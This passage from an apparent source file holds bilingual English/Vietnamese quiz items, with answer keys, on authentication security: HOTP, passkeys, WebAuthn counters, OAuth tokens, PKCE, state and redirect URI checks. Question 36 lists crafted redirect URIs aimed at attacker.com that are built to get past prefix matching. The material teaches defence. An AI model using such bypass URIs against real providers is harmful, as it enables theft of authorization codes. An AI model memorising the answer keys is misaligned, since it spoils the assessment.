sẽ ném lỗi khi hai buffer lệch nhau.',
          ),
        }),

        // q30 · đáp án 0
        mcq({
          prompt: B(
            'In HOTP, the HMAC output is reduced to digits by dynamic truncation: ' + c('const off = mac[mac.length - 1] & 0x0f;') + ' then four bytes are read from that offset with the top bit of the first one masked off. Why is the offset taken from the last byte, and why is that bit masked?',
            'Trong HOTP, đầu ra HMAC được rút xuống thành các chữ số bằng phép cắt động: ' + c('const off = mac[mac.length - 1] & 0x0f;') + ' rồi bốn byte được đọc từ vị trí đó với bit cao nhất của byte đầu bị che đi. Vì sao độ lệch lấy từ byte CUỐI, và vì sao phải che bit đó?',
          ),
          options: [
            B(
              'The offset varies per code so the digits are not always drawn from the same part of the digest, and masking the top bit keeps the four bytes a 31-bit non-negative number in languages with no unsigned integer type',
              'Độ lệch thay đổi theo từng mã nên các chữ số không phải lúc nào cũng lấy từ cùng một chỗ của chuỗi băm, còn việc che bit cao nhất giữ cho bốn byte đó thành một số 31 bit không âm trong những ngôn ngữ không có kiểu số nguyên không dấu',
            ),
            B(
              'The last byte is the only part of an HMAC-SHA1 digest that is uniformly distributed, and masking removes the parity bit that SHA-1 places at the top of every word',
              'Byte cuối là phần duy nhất của một chuỗi băm HMAC-SHA1 có phân bố đều, và việc che đi loại bỏ bit chẵn lẻ mà SHA-1 đặt ở đầu mỗi từ',
            ),
            B(
              'Reading from the end lets the counter be recovered from the code during verification, and the masked bit is a reserved flag that signals whether the code is six or eight digits',
              'Đọc từ cuối cho phép khôi phục lại bộ đếm từ chính cái mã trong lúc kiểm, và bit bị che là một cờ dành riêng báo mã đó sáu hay tám chữ số',
            ),
            B(
              'It compensates for the modulo bias introduced by reducing twenty bytes to six digits, and masking the top bit is what makes the digit distribution exactly uniform',
              'Nó bù lại độ lệch do phép chia lấy dư gây ra khi rút hai mươi byte xuống sáu chữ số, và che bit cao nhất chính là thứ làm phân bố các chữ số đều tuyệt đối',
            ),
          ],
          correct: 0,
          explanation: EX(
            'Both details are engineering, not cryptography. The offset comes from the low nibble of the final byte purely so that different codes read from different places in the digest — a value between 0 and 15, which is why a twenty-byte SHA-1 digest is exactly the right size to always have four bytes available after it. The masking is even more mundane: it clears the sign bit so that the four bytes become a 31-bit number rather than a possibly-negative 32-bit one, which matters in languages without unsigned integers and would otherwise make two implementations disagree. That interoperability is the whole point of the specification being this precise, and it is why the RFC publishes test vectors: run them, and if all six match, every one of these details is right. Two more things worth carrying: the counter must be written as eight bytes big-endian, and although the RFC permits SHA-256 and SHA-512, almost no authenticator app implements them — choosing a "stronger" hash here produces codes that never match. Options 2, 3 and 4 each invent a cryptographic justification for a step that has none.',
            'Cả hai chi tiết đều là chuyện kỹ thuật cài đặt, không phải mật mã học. Độ lệch lấy từ bốn bit thấp của byte cuối cùng chỉ để các mã khác nhau đọc từ những chỗ khác nhau trong chuỗi băm — một giá trị từ 0 tới 15, và đó là lý do một chuỗi băm SHA-1 hai mươi byte có kích thước vừa khít để lúc nào cũng còn đủ bốn byte phía sau. Việc che bit còn tầm thường hơn nữa: nó xoá bit dấu để bốn byte thành một số 31 bit thay vì một số 32 bit có thể âm, điều đó quan trọng trong những ngôn ngữ không có số nguyên không dấu và nếu không thì hai bản cài đặt sẽ bất đồng với nhau. Chính khả năng liên thông ấy là lý do đặc tả phải chính xác tới mức này, và cũng là lý do RFC công bố các vector kiểm thử: chạy chúng, mà cả sáu đều khớp, thì từng chi tiết trong số này đều đúng. Hai thứ nữa đáng mang theo: bộ đếm phải ghi thành tám byte big-endian, và mặc dù RFC cho phép SHA-256 và SHA-512, gần như không app xác thực nào cài chúng — chọn một hàm băm "mạnh hơn" ở đây chỉ sinh ra những cái mã không bao giờ khớp. Phương án 2, 3 và 4 mỗi cái bịa ra một lý do mật mã học cho một bước vốn không có lý do nào như thế.',
          ),
        }),

        // q31 · đáp án 1
        mcq({
          prompt: B(
            'A phishing kit runs a reverse proxy in front of your real login page: genuine HTML, genuine TLS on their own domain, and the second-factor prompt forwarded within seconds. Why does a passkey defeat this when TOTP does not?',
            'Một bộ công cụ lừa đảo chạy một proxy ngược đứng trước chính trang đăng nhập thật của bạn: HTML thật, TLS thật trên tên miền của chúng, và lời nhắc yếu tố thứ hai được chuyển tiếp trong vài giây. Vì sao passkey đánh bại được cách này còn TOTP thì không?',
          ),
          options: [
            B(
              'The passkey private key never leaves the device, whereas a TOTP secret is copied to the server at enrolment and can therefore be stolen from either side',
              'Khoá riêng của passkey không bao giờ rời khỏi thiết bị, trong khi bí mật TOTP được chép sang máy chủ lúc đăng ký nên có thể bị trộm từ cả hai phía',
            ),
            B(
              'The browser signs the origin it is actually on, and that origin is inside the signed data, so a signature produced for the attacker\'s domain does not verify against yours — six digits carry no information about which site asked for them',
              'Trình duyệt KÝ LÊN CHÍNH CÁI ORIGIN nó đang đứng, và origin đó nằm bên trong phần dữ liệu được ký, nên một chữ ký tạo ra cho tên miền của kẻ tấn công không kiểm được với tên miền của bạn — trong khi sáu chữ số chẳng mang thông tin nào về việc trang nào đã hỏi xin chúng',
            ),
            B(
              'Passkeys require user verification through biometrics or a PIN, and a proxy cannot replay a fingerprint, whereas a TOTP code is just typed text that relays perfectly',
              'Passkey đòi xác minh người dùng bằng sinh trắc học hoặc mã PIN, mà một proxy thì không phát lại được một dấu vân tay, còn mã TOTP chỉ là chữ gõ vào nên chuyển tiếp hoàn hảo',
            ),
            B(
              'Passkey assertions are single use and expire in seconds, so the proxy cannot forward one fast enough, whereas a TOTP code stays valid for a full ninety-second window',
              'Các khẳng định của passkey dùng một lần và hết hạn trong vài giây, nên proxy không chuyển tiếp kịp, còn một mã TOTP thì hợp lệ suốt cả cửa sổ chín mươi giây',
            ),
          ],
          correct: 1,
          explanation: EX(
            'The defence is structural rather than statistical. In a WebAuthn assertion the browser includes the origin it is really on inside <code>clientDataJSON</code>, and the signature covers that data together with a hash of the relying-party id. If the user is on the lookalike domain, the browser signs the lookalike domain, and your server\'s check rejects it — the same assertion relayed verbatim from your genuine page fails on the origin comparison too. In practice the browser will not even offer the passkey, because the relying-party id does not match, so there is no prompt for the user to misjudge. TOTP loses because the user is the transport: six digits carry no information about which site requested them, so a proxy that asks for them at the right moment gets a valid code. The same is true of SMS and of plain push. Option 3 identifies a real property of user verification that does not solve relaying — a proxy does not need the fingerprint, only the result. Option 4 invents a timing race the kit wins easily; the challenge is single use, but the attacker is the one who requested it. Option 1 describes a genuine difference that is not the mechanism here. Note what a passkey does not fix: a session token stolen after login, malware on an unlocked device, or an attacker going around through the recovery ladder.',
            'Biện pháp phòng thủ ở đây mang tính CẤU TRÚC chứ không phải xác suất. Trong một khẳng định WebAuthn, trình duyệt nhét cái origin nó đang thật sự đứng vào bên trong <code>clientDataJSON</code>, và chữ ký phủ lên dữ liệu đó cùng với một chuỗi băm của định danh bên tin cậy. Nếu người dùng đang ở trên tên miền nhái thì trình duyệt ký lên tên miền nhái, và phép kiểm của máy chủ bạn từ chối nó — và chính cái khẳng định ấy nếu được chuyển tiếp nguyên văn từ trang thật của bạn thì cũng trượt ở phép so origin. Trên thực tế trình duyệt thậm chí sẽ không CHÌA passkey ra, vì định danh bên tin cậy không khớp, nên chẳng có lời nhắc nào để người dùng phán đoán nhầm. TOTP thua vì NGƯỜI DÙNG CHÍNH LÀ ĐƯỜNG TRUYỀN: sáu chữ số không mang thông tin nào về việc trang nào đã xin chúng, nên một proxy hỏi đúng lúc là có ngay một mã hợp lệ. Điều đó cũng đúng với SMS và với thông báo đẩy thường. Phương án 3 chỉ ra một tính chất có thật của việc xác minh người dùng nhưng nó không giải quyết được việc chuyển tiếp — proxy đâu cần cái dấu vân tay, nó chỉ cần kết quả. Phương án 4 bịa ra một cuộc đua thời gian mà bộ công cụ kia thắng dễ dàng; thử thách đúng là dùng một lần, nhưng chính kẻ tấn công mới là bên đã xin nó. Phương án 1 mô tả một khác biệt có thật nhưng không phải cơ chế ở đây. Nhớ luôn thứ passkey KHÔNG chữa: một token phiên bị trộm SAU khi đăng nhập, mã độc trên một thiết bị đang mở khoá, hay một kẻ tấn công đi vòng qua cái thang khôi phục.',
          ),
        }),

        // q32 · đáp án 2
        mcq({
          prompt: B(
            'A WebAuthn login handler contains ' + c('if (info.newCounter <= stored.counter) throw new Error("cloned!");') + '. It was added to detect cloned authenticators. What does it actually do in production?',
            'Một handler đăng nhập WebAuthn có dòng ' + c('if (info.newCounter <= stored.counter) throw new Error("cloned!");') + '. Nó được thêm vào để phát hiện thiết bị xác thực bị nhân bản. Trên production nó thật sự làm gì?',
          ),
          options: [
            B(
              'It works as intended, and the only cost is that a user who authenticates on two devices at once occasionally sees a spurious warning',
              'Nó chạy đúng như dự định, và cái giá duy nhất là một người dùng xác thực trên hai thiết bị cùng lúc thỉnh thoảng thấy một cảnh báo giả',
            ),
            B(
              'It rejects the first login after any key is re-registered, because re-registration resets the counter to zero while the stored value is still high',
              'Nó từ chối lượt đăng nhập đầu tiên sau khi một khoá được đăng ký lại, vì việc đăng ký lại đưa bộ đếm về không trong khi giá trị đã lưu vẫn còn cao',
            ),
            B(
              'It rejects every login from every synced passkey, forever, because those authenticators report a counter of zero permanently and the specification allows that; compare only when both the stored and the new value are non-zero',
              'Nó từ chối MỌI lượt đăng nhập từ MỌI passkey được đồng bộ, VĨNH VIỄN, vì loại thiết bị đó báo bộ đếm bằng không mãi mãi và đặc tả cho phép điều đó; chỉ nên so khi cả giá trị đã lưu lẫn giá trị mới đều khác không',
            ),
            B(
              'It has no effect at all, because the counter lives in the attestation object which is only present during registration, so <code>newCounter</code> is undefined on every authentication',
              'Nó không có tác dụng gì cả, vì bộ đếm nằm trong đối tượng chứng thực vốn chỉ có mặt lúc đăng ký, nên <code>newCounter</code> là undefined ở mọi lượt xác thực',
            ),
          ],
          correct: 2,
          explanation: EX(
            'The signature counter was designed for hardware keys, where a monotonically increasing value proves that two devices claiming to be the same credential cannot both be genuine. Synced passkeys — the ones in iCloud Keychain and Google Password Manager, which is to say most passkeys — cannot maintain such a counter across devices, so they report zero, permanently, and the specification explicitly allows it. A check written as "reject anything not greater" therefore refuses every login from every Apple and Google passkey, with an error message about cloning. It is a very confident-looking bug: it fails closed, it names a security condition, and it is completely wrong. The correct rule is conditional — compare only when the stored counter and the new value are both non-zero, and when that comparison does fail, treat it as a real signal worth warning the user about. Option 4 is wrong on the mechanics: <code>authenticatorData</code> carries the counter in both ceremonies. Option 1 understates a total outage. Option 2 describes a narrower version of the same family of mistakes. The wider lesson is that a check copied from the hardware-key era can be a denial of service in the passkey era, and the same applies to the backup-eligible and backup-state flags: read them if you are a bank, ignore them otherwise.',
            'Bộ đếm chữ ký được thiết kế cho các khoá phần cứng, nơi một giá trị tăng đơn điệu chứng minh rằng hai thiết bị cùng tự xưng là một tín vật thì không thể cùng thật. Passkey được đồng bộ — loại nằm trong iCloud Keychain và Google Password Manager, tức là phần lớn passkey — không duy trì nổi một bộ đếm như thế giữa các thiết bị, nên chúng báo số không, vĩnh viễn, và đặc tả cho phép điều đó một cách tường minh. Một phép kiểm viết theo kiểu "từ chối mọi thứ không lớn hơn" vì vậy từ chối mọi lượt đăng nhập từ mọi passkey của Apple và Google, kèm một thông báo lỗi nói về chuyện nhân bản. Đây là một con bọ trông rất tự tin: nó hỏng theo hướng đóng, nó gọi tên một điều kiện bảo mật, và nó sai hoàn toàn. Luật đúng là có điều kiện — chỉ so khi cả bộ đếm đã lưu lẫn giá trị mới đều khác không, và khi phép so ấy thật sự trượt thì hãy coi đó là một tín hiệu thật, đáng cảnh báo cho người dùng. Phương án 4 sai về cơ chế: <code>authenticatorData</code> mang bộ đếm ở cả hai nghi thức. Phương án 1 nói nhẹ đi một sự cố toàn phần. Phương án 2 mô tả một phiên bản hẹp hơn của cùng họ sai lầm. Bài học rộng hơn là một phép kiểm chép lại từ thời khoá phần cứng có thể là một cú từ chối dịch vụ trong thời passkey, và điều đó cũng đúng với các cờ đủ-điều-kiện-sao-lưu và đang-được-sao-lưu: hãy đọc chúng nếu bạn là một ngân hàng, còn không thì bỏ qua.',
          ),
        }),

        /* ── Chương 8 — OAuth 2.1 và OpenID Connect (5 câu) ─────────────── */

        // q33 · đáp án 0
        mcq({
          prompt: B(
            'A "sign in with Google" implementation takes the ' + c('access_token') + ' the client sends up, calls Google\'s ' + c('/userinfo') + ' with it, and logs the user in as the returned email. What is wrong with that?',
            'Một bản cài "đăng nhập bằng Google" nhận cái ' + c('access_token') + ' mà client gửi lên, gọi ' + c('/userinfo') + ' của Google bằng nó, rồi đăng nhập người dùng dưới địa chỉ email trả về. Sai ở chỗ nào?',
          ),
          options: [
            B(
              'An access token is a bearer credential issued to <em>some</em> client, and nothing in it names yours; a malicious app can collect a token from its own users and present it to you to be logged in as them. The ID token exists precisely because it carries an <code>aud</code> claim naming its intended recipient',
              'Một access token là một tín vật mang theo được cấp cho MỘT client nào đó, và không có gì trong nó gọi tên client của bạn; một ứng dụng độc hại có thể thu token từ chính người dùng của nó rồi đưa cho bạn để được đăng nhập dưới danh nghĩa họ. ID token tồn tại chính vì nó mang một claim <code>aud</code> gọi tên người nhận dự định',
            ),
            B(
              'The call to <code>/userinfo</code> adds a network round trip on every login, and the endpoint is rate-limited per client, so the design fails under load rather than being insecure',
              'Lời gọi tới <code>/userinfo</code> thêm một vòng đi-về qua mạng ở mỗi lượt đăng nhập, và endpoint đó bị giới hạn tần suất theo client, nên thiết kế này hỏng khi tải cao chứ không phải là mất an toàn',
            ),
            B(
              'Access tokens from Google are opaque rather than JWTs, so the implementation cannot verify the signature and must trust the network path instead',
              'Access token của Google là dạng mờ chứ không phải JWT, nên bản cài này không kiểm được chữ ký và buộc phải tin vào đường mạng thay thế',
            ),
            B(
              'The email in the <code>/userinfo</code> response is the account\'s display address rather than its login address, so a user who has both will be matched to the wrong record',
              'Địa chỉ email trong phản hồi <code>/userinfo</code> là địa chỉ hiển thị của tài khoản chứ không phải địa chỉ đăng nhập, nên một người dùng có cả hai sẽ bị khớp vào sai bản ghi',
            ),
          ],
          correct: 0,
          explanation: EX(
            'This is the confused deputy, in one endpoint. An access token authorises API calls; it does not identify its bearer to you, and — crucially — it does not say who it was issued to. Any developer whose app has ever asked a user for Google access holds tokens for those users, and can post one to your login endpoint. Your server dutifully calls <code>/userinfo</code>, gets a real email address from a real Google API, and signs them in. The fix is to use the right artefact: OIDC\'s <code>id_token</code> is a signed JWT addressed to <em>your</em> client id in its <code>aud</code> claim, and checking <code>aud</code> is the single thing separating "a Google token" from "a Google token for me". Two follow-ons. If you are not calling the provider\'s APIs, discard the access token entirely — a stored token you never use is a long-lived third-party credential sitting in your database. And the provider\'s tokens are never your session: verify, then issue your own. Options 2 and 3 name real operational facts that are not the security problem, and option 4 invents a distinction Google does not make.',
            'Đây là bài toán phó quan lú lẫn, gói gọn trong một endpoint. Một access token CẤP PHÉP cho các lời gọi API; nó không định danh người cầm nó với bạn, và — điều cốt tử — nó không nói nó được cấp cho AI. Bất kỳ lập trình viên nào có ứng dụng từng xin người dùng quyền truy cập Google đều đang giữ token của những người đó, và gửi một cái tới endpoint đăng nhập của bạn được. Máy chủ của bạn ngoan ngoãn gọi <code>/userinfo</code>, nhận về một địa chỉ email thật từ một API thật của Google, rồi cho đăng nhập. Cách sửa là dùng đúng hiện vật: <code>id_token</code> của OIDC là một JWT đã ký, ĐỀ TÊN client id CỦA BẠN trong claim <code>aud</code>, và kiểm <code>aud</code> chính là thứ duy nhất phân biệt "một token của Google" với "một token của Google DÀNH CHO TÔI". Hai hệ quả. Nếu bạn không gọi API nào của nhà cung cấp thì hãy vứt hẳn access token đi — một token cất lại mà không bao giờ dùng là một tín vật của bên thứ ba sống lâu nằm trong cơ sở dữ liệu của bạn. Và token của nhà cung cấp không bao giờ là phiên của bạn: kiểm xong rồi tự cấp phiên của mình. Phương án 2 và 3 gọi tên những sự thật vận hành có thật nhưng không phải vấn đề bảo mật ở đây, còn phương án 4 bịa ra một sự phân biệt mà Google không hề có.',
          ),
        }),

        // q34 · đáp án 2
        mcq({
          prompt: B(
            'OAuth 2.1 requires PKCE for every client, including a backend that holds a client secret. If the secret already proves who the client is, what does PKCE add?',
            'OAuth 2.1 đòi PKCE cho MỌI client, kể cả một backend đang giữ client secret. Nếu cái secret đã chứng minh client là ai rồi thì PKCE thêm được gì?',
          ),
          options: [
            B(
              'It replaces the client secret for deployments where the secret cannot be kept safely, which is why the requirement is universal — a single flow now works for both public and confidential clients',
              'Nó thay thế client secret ở những nơi không giữ secret an toàn được, và đó là lý do yêu cầu này áp cho tất cả — giờ chỉ một luồng duy nhất dùng được cho cả client công khai lẫn client bí mật',
            ),
            B(
              'It binds the authorization code to the user\'s browser session, so a code stolen from the redirect cannot be redeemed from a different device',
              'Nó buộc mã cấp phép vào phiên trình duyệt của người dùng, nên một mã bị trộm từ lệnh chuyển hướng không thể đổi được từ một thiết bị khác',
            ),
            B(
              'It binds the code to the flow that requested it, which closes code injection: an attacker who gets the victim\'s browser to deliver the attacker\'s own code to your callback cannot complete the exchange, because they do not hold the verifier your server generated',
              'Nó buộc mã vào chính cái luồng đã yêu cầu nó, và điều đó đóng cú tiêm mã: kẻ tấn công khiến trình duyệt nạn nhân giao mã CỦA CHÍNH NÓ tới callback của bạn cũng không hoàn tất được bước đổi, vì nó không giữ cái verifier mà máy chủ của bạn đã sinh ra',
            ),
            B(
              'It removes the need to send <code>redirect_uri</code> at the token endpoint, since the challenge already ties the exchange to the original request',
              'Nó bỏ được nhu cầu gửi lại <code>redirect_uri</code> ở endpoint token, vì cái challenge đã buộc bước đổi vào request ban đầu rồi',
            ),
          ],
          correct: 2,
          explanation: EX(
            'PKCE began as a fix for mobile: on a device, a malicious app registering the same custom URL scheme could catch the authorization code as it came back, and there was no client secret to stop it. That is the story most people know, and it is why the requirement looked unnecessary for a backend. Then came code injection, which does not care about client secrets at all. The attacker starts a flow themselves, keeps the unredeemed code, and gets the victim\'s browser to deliver <em>that</em> code to your callback. Your server has a secret, uses it faithfully, and completes an exchange for the wrong account. PKCE closes it because your server generated a verifier at the start of the real flow and sends it at the exchange; the attacker\'s code was issued against a different challenge, so the token endpoint refuses. Two practical notes: always use <code>S256</code>, since <code>plain</code> sends the verifier itself as the challenge and some providers still accept it; and keep the verifier server-side against the session, exactly like a WebAuthn challenge, never round-tripped through the client. Option 4 is wrong on the specification — <code>redirect_uri</code> must still be sent and is compared. Option 2 misstates the binding, which is to the flow, not the device.',
            'PKCE ra đời như một bản vá cho di động: trên một thiết bị, một ứng dụng độc hại đăng ký cùng một lược đồ URL tuỳ chỉnh có thể chộp lấy mã cấp phép lúc nó quay về, và không có client secret nào để chặn. Đó là câu chuyện phần lớn mọi người biết, và cũng là lý do yêu cầu này trông có vẻ thừa với một backend. Rồi tới cú tiêm mã, thứ chẳng bận tâm gì tới client secret. Kẻ tấn công tự khởi động một luồng, giữ lại cái mã chưa đổi, và khiến trình duyệt nạn nhân giao CHÍNH cái mã đó tới callback của bạn. Máy chủ của bạn có secret, dùng nó một cách trung thực, và hoàn tất một lượt đổi cho nhầm tài khoản. PKCE đóng chỗ đó vì máy chủ của bạn đã sinh một verifier ở đầu cái luồng THẬT và gửi nó lúc đổi; còn mã của kẻ tấn công thì được cấp dựa trên một challenge khác, nên endpoint token từ chối. Hai ghi chú thực dụng: luôn dùng <code>S256</code>, vì <code>plain</code> gửi chính cái verifier làm challenge và vài nhà cung cấp vẫn còn nhận nó; và giữ verifier ở phía máy chủ, gắn với phiên, y hệt một thử thách WebAuthn, đừng bao giờ cho nó đi vòng qua client. Phương án 4 sai so với đặc tả — <code>redirect_uri</code> vẫn phải gửi và vẫn bị đối chiếu. Phương án 2 nói sai chỗ buộc: buộc vào cái LUỒNG chứ không phải cái thiết bị.',
          ),
        }),

        // q35 · đáp án 3
        mcq({
          prompt: B(
            'An OAuth callback handler exchanges the code without checking ' + c('state') + '. What can an attacker do, and who ends up compromised?',
            'Một handler callback OAuth đổi mã mà không kiểm ' + c('state') + '. Kẻ tấn công làm được gì, và cuối cùng ai là người bị hại?',
          ),
          options: [
            B(
              'They can replay a previously used code to obtain a second set of tokens for the victim\'s account, since without state the server has no way to detect a repeat',
              'Nó phát lại được một cái mã đã dùng để lấy thêm một bộ token nữa cho tài khoản của nạn nhân, vì không có state thì máy chủ không có cách nào phát hiện sự lặp lại',
            ),
            B(
              'They can substitute their own <code>redirect_uri</code> at the authorization step and have the victim\'s code delivered to a host they control',
              'Nó thay được <code>redirect_uri</code> của chính mình ở bước cấp phép và khiến mã của nạn nhân được giao tới một máy chủ nó điều khiển',
            ),
            B(
              'Nothing beyond nuisance: without the client secret the attacker cannot complete the exchange, so a missing state check costs a wasted request and no more',
              'Không gì hơn ngoài phiền phức: không có client secret thì kẻ tấn công không hoàn tất được bước đổi, nên thiếu phép kiểm state chỉ tốn một request vô ích chứ không hơn',
            ),
            B(
              'They run the flow with their own provider account, keep the unused code, and make the victim\'s browser visit the callback with it — so the attacker\'s provider account gets linked into the victim\'s session, and from then on the victim works inside an account the attacker can also sign into',
              'Nó chạy luồng bằng tài khoản nhà cung cấp CỦA CHÍNH NÓ, giữ lại cái mã chưa dùng, rồi khiến trình duyệt nạn nhân ghé vào callback kèm mã đó — thế là tài khoản nhà cung cấp của kẻ tấn công được nối vào phiên của nạn nhân, và từ đó nạn nhân làm việc bên trong một tài khoản mà kẻ tấn công cũng đăng nhập được',
            ),
          ],
          correct: 3,
          explanation: EX(
            'This is CSRF on the callback, and the direction of the attack is what makes it easy to underestimate. The attacker does not take over the victim\'s account — they push their own identity into it. Everything from then on that the victim does inside that account, the attacker can see and act on, because they can sign in with their own provider credentials. On a product where that account holds documents, payment methods or an organisation membership, that is a full compromise pointing the other way. The fix is three lines: random bytes generated per flow, stored server-side against the session before redirecting, compared and deleted on the callback — and it must be bound to the session, since a value kept in a global cache and merely checked for existence is no defence. Reject a missing or mismatched state <em>before</em> the code is exchanged. Two neighbours to keep straight: <code>state</code> protects the front-channel callback while <code>nonce</code> protects the ID token on the back channel, and an absent <code>nonce</code> where you expected one is a failure rather than an acceptable default. Also carry the return path server-side beside the state rather than encoding it into the state value, and never take a redirect target from the callback query string.',
            'Đây là CSRF trên đường callback, và chính CHIỀU của cú tấn công khiến người ta dễ đánh giá thấp nó. Kẻ tấn công không chiếm tài khoản của nạn nhân — nó ĐẨY danh tính của chính nó vào tài khoản ấy. Từ đó về sau, mọi thứ nạn nhân làm bên trong tài khoản đó thì kẻ tấn công đều thấy và can thiệp được, vì nó đăng nhập vào bằng chính tín vật nhà cung cấp của nó. Trên một sản phẩm mà tài khoản đó giữ tài liệu, phương thức thanh toán hay tư cách thành viên trong một tổ chức, đó là một vụ chiếm đoạt trọn vẹn, chỉ là chỉ theo chiều ngược lại. Cách sửa gọn ba dòng: sinh vài byte ngẫu nhiên cho mỗi luồng, cất ở phía máy chủ gắn với phiên TRƯỚC khi chuyển hướng, đối chiếu rồi xoá lúc callback — và nó phải BUỘC VÀO PHIÊN, vì một giá trị nằm trong một cache toàn cục rồi chỉ kiểm xem có tồn tại hay không thì không phải phòng thủ. Hãy từ chối một state thiếu hoặc lệch TRƯỚC khi đổi mã. Hai thứ hàng xóm cần phân biệt cho rõ: <code>state</code> bảo vệ đường callback ở kênh trước còn <code>nonce</code> bảo vệ ID token ở kênh sau, và một <code>nonce</code> vắng mặt ở chỗ bạn mong có nó là một lỗi chứ không phải một mặc định chấp nhận được. Ngoài ra hãy mang đường quay về ở phía máy chủ nằm cạnh state chứ đừng nhét nó vào trong chính giá trị state, và đừng bao giờ lấy đích chuyển hướng từ chuỗi truy vấn của callback.',
          ),
        }),

        // q36 · đáp án 1
        mcq({
          prompt: B(
            'A provider matches the registered redirect URI with ' + c('startsWith') + '. The registered value is ' + c('https://example.com/oauth/cb') + '. Which submitted URI is accepted by that rule while resolving to a host the developer did not intend?',
            'Một nhà cung cấp đối chiếu redirect URI đã đăng ký bằng ' + c('startsWith') + '. Giá trị đã đăng ký là ' + c('https://example.com/oauth/cb') + '. URI nào được luật đó CHẤP NHẬN trong khi phân giải ra một host mà lập trình viên không hề định tới?',
          ),
          options: [
            B(
              c('https://example.com.attacker.com/oauth/cb') + ', because the registered string appears at the start of the hostname',
              c('https://example.com.attacker.com/oauth/cb') + ', vì chuỗi đã đăng ký xuất hiện ở đầu tên máy',
            ),
            B(
              c('https://example.com/oauth/cb/../../elsewhere') + ' and ' + c('https://example.com/oauth/cb#@attacker.com') + ', because both begin with the registered string and both then travel somewhere the developer did not register',
              c('https://example.com/oauth/cb/../../elsewhere') + ' và ' + c('https://example.com/oauth/cb#@attacker.com') + ', vì cả hai đều BẮT ĐẦU bằng chuỗi đã đăng ký và cả hai sau đó đều đi tới chỗ lập trình viên không hề đăng ký',
            ),
            B(
              c('https://example.com@attacker.com/oauth/cb') + ', because the userinfo trick makes the real host <code>attacker.com</code> while the string still starts correctly',
              c('https://example.com@attacker.com/oauth/cb') + ', vì mẹo phần thông tin đăng nhập khiến host thật là <code>attacker.com</code> trong khi chuỗi vẫn bắt đầu đúng',
            ),
            B(
              'None of them: prefix matching is equivalent to exact matching whenever the registered value ends in a path segment rather than a slash',
              'Không cái nào: khớp theo tiền tố tương đương với khớp chính xác mỗi khi giá trị đã đăng ký kết thúc bằng một đoạn đường dẫn chứ không phải một dấu gạch chéo',
            ),
          ],
          correct: 1,
          explanation: EX(
            'Run the candidates through <code>new URL()</code> and the picture is clear. The two <code>@</code> variants and the <code>example.com.attacker.com</code> variant do resolve to the attacker\'s host — that is why they are famous — but none of them passes <code>startsWith</code> against this registered value, because the string diverges before the path begins. The ones that slip through the prefix rule are the ones that <em>keep</em> the registered prefix intact and then add to it: a path traversal that walks back out, an appended query parameter, or a fragment. Those all report <code>example.com</code> as the host and still deliver the code somewhere it was not meant to go. That is the real lesson of the table: every clever matching rule has its own bypass, and they are different bypasses, so the ones you defend against are not the ones you get. OAuth 2.1 settles it by requiring an exact match against a registered string, byte for byte, with no normalisation and no pattern — and no wildcard subdomains, which turn one stale CNAME into a full compromise. Two things the exact match still does not cover: an open redirect anywhere else on your domain will forward the code onward with the token riding in the <code>Referer</code>, and localhost URLs registered on the production client let anyone running a local server complete a production flow.',
            'Đẩy các ứng viên qua <code>new URL()</code> là thấy rõ bức tranh. Hai biến thể có dấu <code>@</code> và biến thể <code>example.com.attacker.com</code> đúng là phân giải ra host của kẻ tấn công — chính vì thế chúng nổi tiếng — nhưng không cái nào qua được phép <code>startsWith</code> với giá trị đã đăng ký này, vì chuỗi rẽ nhánh từ trước khi tới phần đường dẫn. Những cái LỌT QUA luật tiền tố lại là những cái GIỮ NGUYÊN phần tiền tố đã đăng ký rồi nối thêm vào: một cú đi ngược đường dẫn, một tham số truy vấn nối thêm, hay một mảnh fragment. Cả nhóm đó đều báo host là <code>example.com</code> mà vẫn giao cái mã tới chỗ nó không được phép tới. Đó mới là bài học thật của cái bảng: mọi luật đối chiếu khôn khéo đều có đường vòng riêng của nó, và chúng là những đường vòng KHÁC NHAU, nên cái bạn phòng thủ không phải cái bạn nhận. OAuth 2.1 chốt lại bằng cách đòi khớp CHÍNH XÁC với một chuỗi đã đăng ký, từng byte một, không chuẩn hoá, không mẫu — và không tên miền con đại diện, thứ biến một bản ghi CNAME bỏ quên thành một vụ chiếm đoạt trọn vẹn. Hai thứ mà ngay cả khớp chính xác vẫn không phủ: một lệnh chuyển hướng mở ở bất kỳ đâu khác trên tên miền của bạn sẽ đẩy cái mã đi tiếp với token cưỡi trong <code>Referer</code>, và những URL localhost đăng ký trên client production cho phép bất kỳ ai chạy một máy chủ nội bộ hoàn tất một luồng production.',
          ),
        }),

        // q37 · đáp án 0
        mcq({
          prompt: B(
            'An ID token verifies correctly and carries ' + c('email: "admin@yourcompany.com"') + ' with ' + c('email_verified: false') + '. Your login handler looks the account up by email and signs the user in. What has just happened, and what is the durable fix?',
            'Một ID token kiểm chữ ký hợp lệ và mang ' + c('email: "admin@yourcompany.com"') + ' kèm ' + c('email_verified: false') + '. Handler đăng nhập của bạn tra tài khoản theo email rồi cho đăng nhập. Vừa xảy ra chuyện gì, và cách sửa bền vững là gì?',
          ),
          options: [
            B(
              'An account takeover: the address is a claim rather than a fact until the provider says otherwise, and anyone can type it into a profile field at a lax provider. Refuse any token whose <code>email_verified</code> is not exactly true, and key the account on the pair <code>(provider, sub)</code> rather than on the address',
              'Một vụ chiếm tài khoản: địa chỉ đó chỉ là một LỜI KHAI chứ chưa phải một SỰ THẬT cho tới khi nhà cung cấp nói khác đi, và ai cũng gõ được nó vào một ô hồ sơ ở một nhà cung cấp dễ dãi. Hãy từ chối mọi token có <code>email_verified</code> không đúng bằng true, và đánh khoá tài khoản theo cặp <code>(provider, sub)</code> chứ không theo địa chỉ',
            ),
            B(
              'Nothing yet: the signature verified, so the provider vouched for the whole payload including the address, and <code>email_verified</code> only reports whether the user completed an optional profile step',
              'Chưa có gì cả: chữ ký đã kiểm được, nên nhà cung cấp đã đứng ra bảo đảm cho toàn bộ payload kể cả địa chỉ, còn <code>email_verified</code> chỉ báo người dùng đã hoàn tất một bước hồ sơ tuỳ chọn hay chưa',
            ),
            B(
              'A misconfiguration: <code>email_verified</code> should have been requested as a scope, and adding it to the authorization request makes the provider populate the field correctly',
              'Một lỗi cấu hình: <code>email_verified</code> lẽ ra phải được xin dưới dạng một scope, và thêm nó vào request cấp phép sẽ khiến nhà cung cấp điền đúng trường đó',
            ),
            B(
              'A replay: the same ID token was accepted twice, and the fix is to record the <code>jti</code> of every ID token you have already consumed',
              'Một cú phát lại: cùng một ID token được nhận hai lần, và cách sửa là ghi lại <code>jti</code> của mọi ID token bạn đã tiêu',
            ),
          ],
          correct: 0,
          explanation: EX(
